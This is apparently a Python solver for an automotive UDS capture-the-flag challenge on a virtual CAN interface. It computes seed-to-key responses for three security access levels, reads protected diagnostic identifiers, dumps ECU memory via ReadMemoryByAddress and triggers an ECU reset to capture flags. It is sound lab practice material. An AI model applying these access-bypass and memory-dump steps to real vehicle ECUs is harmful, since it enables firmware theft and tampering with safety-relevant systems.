#!/usr/bin/env python3
import isotp
import struct
import time

def calc_key_level5(seed):
    # 级别5密钥算法 - 与服务器端一致
    key = seed
    
    # 步骤1: 多重异或
    key ^= 0x12345678
    key ^= 0x87654321
    
    # 步骤2: 循环右移
    key = (key >> 13) | (key << 19)
    
    # 步骤3: 位运算
    key = (key & 0xFF00FF00) | ((key & 0x00FF00FF) ^ 0x55555555)
    
    # 步骤4: 加法运算
    key += 0xDEADBEEF
    
    # 步骤5: 最终异或
    key ^= 0xCAFEBABE
    
    return key & 0xFFFFFFFF

def dump_memory(s, start_addr, size, step=0x50, output_file="memory_dump.bin"):
    """dump内存并寻找flag，同时保存到文件"""
    print(f"开始dump内存: 0x{start_addr:08X} - 0x{start_addr+size:08X}")
    print(f"内存数据将保存到: {output_file}")
    
    found_flags = []
    current_addr = start_addr
    
    # 限制地址范围，避免访问无效内存
    max_addr = 0x7FFFFFFF  # 最大允许地址（32位地址空间）
    if start_addr + size > max_addr:
        size = max_addr - start_addr
        print(f"调整dump大小到: 0x{size:08X}")
    
    # 创建输出文件
    with open(output_file, 'wb') as f:
        while current_addr < start_addr + size:
            # 计算本次读取大小（确保不超过单帧限制）
            read_size = min(step, start_addr + size - current_addr)
            
            # 检查地址是否在有效范围内
            if current_addr >= max_addr:
                print(f"地址超出范围: 0x{current_addr:08X}，停止dump")
                break
            
            # 使用标准UDS ReadMemoryByAddress格式
            # 格式标识符: 0x14 表示1字节大小 + 4字节地址
            # 地址: 4字节，大端序
            # 大小: 1字节
            addr_bytes = struct.pack('>I', current_addr)  # 4字节地址，大端序
            size_bytes = struct.pack('>B', read_size & 0xFF)  # 1字节大小
            
            # 构造请求数据: 0x23 + 0x14 + 地址(4字节) + 大小(1字节) = 7字节
            request_data = bytes([0x23, 0x14]) + addr_bytes + size_bytes
            print(f"请求: 0x{current_addr:08X}, 大小{read_size}")
            print(f"请求数据: {' '.join([f'{b:02X}' for b in request_data])}")
            
            try:
                # 发送请求
                s.send(request_data)
                
                # 接收响应
                response = s.recv()
                
                if response and response[0] == 0x63:
                    # 解析内存数据
                    memory_data = response[2:]  # 跳过0x63和格式标识符
                    
                    # 直接写入内存数据，不写入额外信息
                    f.write(memory_data)
                    
                    # 在内存数据中寻找flag
                    try:
                        data_str = memory_data.decode('utf-8', errors='ignore')
                        if 'UDSCTF{' in data_str:
                            # 找到flag
                            start_idx = data_str.find('UDSCTF{')
                            end_idx = data_str.find('}', start_idx)
                            if end_idx != -1:
                                flag = data_str[start_idx:end_idx+1]
                                found_flags.append((current_addr, flag))
                                print(f"找到flag: {flag} (地址: 0x{current_addr:08X})")
                    except:
                        pass
                    
                    # 打印前16字节的十六进制
                    if len(memory_data) > 0:
                        hex_data = ' '.join([f"{b:02X}" for b in memory_data[:16]])
                        print(f"0x{current_addr:08X}: {hex_data}")
                        
                        # 检查是否全是零（可能表示无效内存）
                        if all(b == 0 for b in memory_data[:16]):
                            print(f"警告: 地址 0x{current_addr:08X} 返回全零数据，可能无效")
                else:
                    # 如果读取失败，写入零数据
                    print(f"读取地址 0x{current_addr:08X} 失败，写入零数据")
                    f.write(b'\x00' * read_size)
                
            except Exception as e:
                print(f"读取地址 0x{current_addr:08X} 时出错: {e}")
                # 写入零数据
                f.write(b'\x00' * read_size)
            
            current_addr += read_size
            time.sleep(0.01)  # 小延迟避免过快
    
    print(f"内存dump完成，数据已保存到: {output_file}")
    return found_flags

def get_flags():
    # 使用isotp.socket()而不是can.interface.Bus
    s = isotp.socket()
    
    # 设置isotp参数，确保多帧传输正常工作（必须在bind之前设置）
    s.set_fc_opts(stmin=0, bs=0)  # 设置流控参数
    
    s.bind('vcan0', isotp.Address(rxid=0x7e8, txid=0x7e0))
    
    print("获取UDS CTF flags...")
    
    # 1. 公开flag
    print("\n[1] 获取公开flag...")
    s.send(bytes([0x22, 0xF1, 0x90]))
    response = s.recv()
    if response and response[0] == 0x62:
        flag = response[3:].decode('utf-8', errors='ignore')
        print(f"公开flag: {flag}")
    
    # 2. 安全flag (级别1)
    print("\n[2] 获取安全flag...")
    # 请求seed
    s.send(bytes([0x27, 0x01]))
    response = s.recv()
    if response and response[0] == 0x67:
        seed = response[2:6]  # 跳过0x67和0x01
        if seed != b'\x00\x00\x00\x00':
            key_val = struct.unpack('>I', seed)[0] ^ 0xdeadbeef
            key = struct.pack('>I', key_val)
            # 发送key
            s.send(bytes([0x27, 0x02]) + key)
            response = s.recv()
            if response and response[0] == 0x67:
                # 读取安全flag
                s.send(bytes([0x22, 0xC1, 0xC2]))
                response = s.recv()
                if response and response[0] == 0x62:
                    flag = response[3:].decode('utf-8', errors='ignore')
                    print(f"获取到安全访问级别1下DID：C1C2的flag: {flag}")
    
    # 3. 高级flag (级别3)
    print("\n[3] 获取高级flag...")
    # 切换到编程会话
    s.send(bytes([0x10, 0x02]))
    s.recv()
    # 请求级别3 seed
    s.send(bytes([0x27, 0x03]))
    response = s.recv()
    if response and response[0] == 0x67:
        seed = response[2:6]
        if seed != b'\x00\x00\x00\x00':
            # 计算级别3 key
            key_val = struct.unpack('>I', seed)[0]
            key_val = ((key_val << 7) | (key_val >> 25)) & 0xFFFFFFFF
            key_val ^= 0xCAFEBABE
            key_val = (key_val + 0x12345678) & 0xFFFFFFFF
            key_val = (key_val & 0xFFFF0000) | ((key_val & 0x0000FFFF) ^ 0xABCD)
            key_val ^= 0xDEADBEEF
            # 发送级别3 key
            key = struct.pack('>I', key_val)
            s.send(bytes([0x27, 0x04]) + key)
            response = s.recv()
            if response and response[0] == 0x67:
                # 读取高级flag
                s.send(bytes([0x22, 0xD1, 0xD2]))
                response = s.recv()
                if response and response[0] == 0x62:
                    flag = response[3:].decode('utf-8', errors='ignore')
                    print(f"获取到安全访问级别3下DID：D1D2的flag: {flag}")
    
    # 4. 内存dump (级别5)
    print("\n[4] 获取内存flag...")
    # 请求级别5 seed
    s.send(bytes([0x27, 0x05]))
    response = s.recv()
    if response and response[0] == 0x67:
        seed = response[2:6]
        if seed != b'\0\0\0\0':
            # 计算级别5 key
            key_val = struct.unpack('>I', seed)[0]
            key_val = calc_key_level5(key_val)
            # 发送级别5 key
            key = struct.pack('>I', key_val)
            s.send(bytes([0x27, 0x06]) + key)
            response = s.recv()
            if response and response[0] == 0x67:
                print("级别5安全访问成功")
                
                # 开始内存dump，寻找flag
                # 从程序基址开始dump，使用较小的读取大小避免多帧
                print("\n开始内存dump...")
                found_flags = dump_memory(s, 0x40000000, 0x20000, 0x50, "uds_memory_dump.bin")  # dump 64KB，每次读取80字节
                
                if found_flags:
                    print(f"\n找到 {len(found_flags)} 个flag:")
                    for addr, flag in found_flags:
                        print(f"  地址 0x{addr:08X}: {flag}")
                        print("若未找到flag可能恰好字符串被分割，请下载固件自行搜索")
                else:
                    print("未找到内存中的flag")
                    
    # 5. 启动flag (监听)
    print("\n[5] 监听启动flag...")
    s.send(bytes([0x11, 0x01]))
    # 启动flag通常在服务器启动时发送，这里尝试接收
    try:
        s.settimeout(10.0)  # 设置10秒超时
        response = s.recv()
        if response and len(response) > 4:
            flag_data = response[3:]
            try:
                flag = flag_data.decode('utf-8', errors='ignore')
                if 'UDSCTF{' in flag:
                    print(f"获取到复位时flag: {flag}")
            except:
                pass
    except:
        print("启动flag监听超时")
    
    s.close()

if __name__ == "__main__":
    get_flags()
